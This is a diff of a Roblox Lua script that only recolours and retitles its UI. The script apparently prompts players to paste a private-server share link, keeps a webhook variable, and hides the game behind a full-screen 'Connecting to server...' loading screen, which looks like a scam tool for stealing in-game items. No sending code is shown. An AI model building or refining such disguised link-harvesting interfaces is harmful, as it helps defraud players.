@@ -26,7 +26,7 @@ local lastUsedWebhook = nil
 
 --- traits map
 local traitMap = {
-   ["rbxassetid://99181785766598"] = "Galaxy",
+    ["rbxassetid://99181785766598"] = "Galaxy",
     ["rbxassetid://110723387483939"] = "Tung Attack",
     ["rbxassetid://104964195846833"] = "Crab",
     ["rbxassetid://118283346037788"] = "Solar",
@@ -232,14 +232,14 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.new(0, 500, 0, 320)
 MainFrame.Position = UDim2.new(0.5, -250, 0.5, -160)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Black
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = ScreenGui
 
 local UIGradient = Instance.new("UIGradient")
 UIGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 25))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 30)), -- Black Gradient
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))  -- Black Gradient
 })
 UIGradient.Parent = MainFrame
 
@@ -249,14 +249,14 @@ UICorner.Parent = MainFrame
 
 local TopBar = Instance.new("Frame")
 TopBar.Size = UDim2.new(1, 0, 0, 70)
-TopBar.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+TopBar.BackgroundColor3 = Color3.fromRGB(110, 80, 190) -- Violet
 TopBar.BorderSizePixel = 0
 TopBar.Parent = MainFrame
 
 local TopGradient = Instance.new("UIGradient")
 TopGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 50)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 30))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 100, 210)), -- Violet Gradient
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 60, 170))   -- Violet Gradient
 })
 TopGradient.Parent = TopBar
 
@@ -299,23 +299,23 @@ end)
 
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, -40, 1, 0)
-Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Position = UDim2.new(0, 30, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "TOOLS HUB"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Text = "Server Link"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 22
-Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = TopBar
 
 local InputBox = Instance.new("TextBox")
 InputBox.Size = UDim2.new(1, -60, 0, 52)
 InputBox.Position = UDim2.new(0, 30, 0, 90)
-InputBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InputBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30) -- Black
 InputBox.BackgroundTransparency = 0
-InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
 InputBox.PlaceholderText = "https://www.roblox.com/share?code=..."
-InputBox.PlaceholderColor3 = Color3.fromRGB(150, 150, 170)
+InputBox.PlaceholderColor3 = Color3.fromRGB(200, 200, 200) -- Muted White
 InputBox.Text = ""
 InputBox.Font = Enum.Font.GothamBold
 InputBox.TextSize = 15
@@ -325,8 +325,8 @@ InputBox.Parent = MainFrame
 
 local InputGradient = Instance.new("UIGradient")
 InputGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 40))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)), -- Black Gradient
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25))  -- Black Gradient
 })
 InputGradient.Parent = InputBox
 
@@ -342,8 +342,8 @@ InputCorner.Parent = InputBox
 local StartButton = Instance.new("TextButton")
 StartButton.Size = UDim2.new(1, -60, 0, 52)
 StartButton.Position = UDim2.new(0, 30, 0, 170)
-StartButton.BackgroundColor3 = Color3.fromRGB(148, 0, 211)
-StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StartButton.BackgroundColor3 = Color3.fromRGB(110, 80, 190) -- Violet
+StartButton.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
 StartButton.Text = "Continue"
 StartButton.Font = Enum.Font.GothamBold
 StartButton.TextSize = 16
@@ -352,8 +352,8 @@ StartButton.Parent = MainFrame
 
 local ButtonGradient = Instance.new("UIGradient")
 ButtonGradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(70, 140, 240)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(50, 120, 220))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 100, 210)), -- Violet Gradient
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 60, 170))   -- Violet Gradient
 })
 ButtonGradient.Parent = StartButton
 
@@ -362,12 +362,12 @@ ButtonCorner.CornerRadius = UDim.new(0, 12)
 ButtonCorner.Parent = StartButton
 
 StartButton.MouseEnter:Connect(function()
-    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70, 140, 240)}):Play()
+    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(130, 100, 210)}):Play() -- Lighter Violet
     TweenService:Create(ButtonGradient, TweenInfo.new(0.2), {Offset = Vector2.new(0, 0)}):Play()
 end)
 
 StartButton.MouseLeave:Connect(function()
-    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 120, 220)}):Play()
+    TweenService:Create(StartButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(110, 80, 190)}):Play() -- Main Violet
 end)
 
 local ErrorLabel = Instance.new("TextLabel")
@@ -375,7 +375,7 @@ ErrorLabel.Size = UDim2.new(1, -60, 0, 25)
 ErrorLabel.Position = UDim2.new(0, 30, 0, 240)
 ErrorLabel.BackgroundTransparency = 1
 ErrorLabel.Text = ""
-ErrorLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
+ErrorLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White (was Red)
 ErrorLabel.Font = Enum.Font.Gotham
 ErrorLabel.TextSize = 13
 ErrorLabel.Visible = false
@@ -705,15 +705,15 @@ local function showLoadingScreen()
     
     local Background = Instance.new("Frame")
     Background.Size = UDim2.new(1, 0, 1, 0)
-    Background.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+    Background.BackgroundColor3 = Color3.fromRGB(10, 10, 10) -- Black
     Background.BorderSizePixel = 0
     Background.Parent = LoadingGui
     
     local BgGradient = Instance.new("UIGradient")
     BgGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 35)),
-        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 10, 20)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 30))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(20, 20, 20)), -- Black Gradient
+        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(10, 10, 10)), -- Black Gradient
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(15, 15, 15))  -- Black Gradient
     })
     BgGradient.Rotation = 45
     BgGradient.Parent = Background
@@ -721,14 +721,14 @@ local function showLoadingScreen()
     local Container = Instance.new("Frame")
     Container.Size = UDim2.new(0, 700, 0, 380)
     Container.Position = UDim2.new(0.5, -350, 0.5, -190)
-    Container.BackgroundColor3 = Color3.fromRGB(18, 18, 28)
+    Container.BackgroundColor3 = Color3.fromRGB(25, 25, 25) -- Black
     Container.BorderSizePixel = 0
     Container.Parent = Background
     
     local ContainerGradient = Instance.new("UIGradient")
     ContainerGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 55)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 18, 28))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(35, 35, 35)), -- Black Gradient
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 20))  -- Black Gradient
     })
     ContainerGradient.Parent = Container
     
@@ -740,7 +740,7 @@ local function showLoadingScreen()
     LoadingText.Size = UDim2.new(1, 0, 0, 80)
     LoadingText.BackgroundTransparency = 1
     LoadingText.Text = "Initializing"
-    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White
     LoadingText.Font = Enum.Font.GothamBold
     LoadingText.TextSize = 48
     LoadingText.Parent = Container
@@ -750,7 +750,7 @@ local function showLoadingScreen()
     StatusText.Position = UDim2.new(0, 0, 0, 85)
     StatusText.BackgroundTransparency = 1
     StatusText.Text = "Connecting to server..."
-    StatusText.TextColor3 = Color3.fromRGB(180, 180, 200)
+    StatusText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White (was off-white)
     StatusText.Font = Enum.Font.Gotham
     StatusText.TextSize = 20
     StatusText.Parent = Container
@@ -758,7 +758,7 @@ local function showLoadingScreen()
     local LoadingBarBackground = Instance.new("Frame")
     LoadingBarBackground.Size = UDim2.new(0.8, 0, 0, 8)
     LoadingBarBackground.Position = UDim2.new(0.1, 0, 0, 160)
-    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
+    LoadingBarBackground.BackgroundColor3 = Color3.fromRGB(40, 40, 40) -- Black
     LoadingBarBackground.BorderSizePixel = 0
     LoadingBarBackground.Parent = Container
     
@@ -768,7 +768,7 @@ local function showLoadingScreen()
     
     local LoadingBar = Instance.new("Frame")
     LoadingBar.Size = UDim2.new(0, 0, 1, 0)
-    LoadingBar.BackgroundColor3 = Color3.fromRGB(100, 180, 255)
+    LoadingBar.BackgroundColor3 = Color3.fromRGB(110, 80, 190) -- Violet
     LoadingBar.BorderSizePixel = 0
     LoadingBar.Parent = LoadingBarBackground
     
@@ -778,8 +778,8 @@ local function showLoadingScreen()
     
     local BarGradient = Instance.new("UIGradient")
     BarGradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 180, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(60, 140, 240))
+        ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 100, 210)), -- Violet Gradient
+        ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 60, 170))   -- Violet Gradient
     })
     BarGradient.Parent = LoadingBar
     
@@ -788,7 +788,7 @@ local function showLoadingScreen()
     PercentageText.Position = UDim2.new(0, 0, 0, 195)
     PercentageText.BackgroundTransparency = 1
     PercentageText.Text = "0%"
-    PercentageText.TextColor3 = Color3.fromRGB(220, 220, 240)
+    PercentageText.TextColor3 = Color3.fromRGB(255, 255, 255) -- White (was off-white)
     PercentageText.Font = Enum.Font.GothamMedium
     PercentageText.TextSize = 24
     PercentageText.Parent = Container
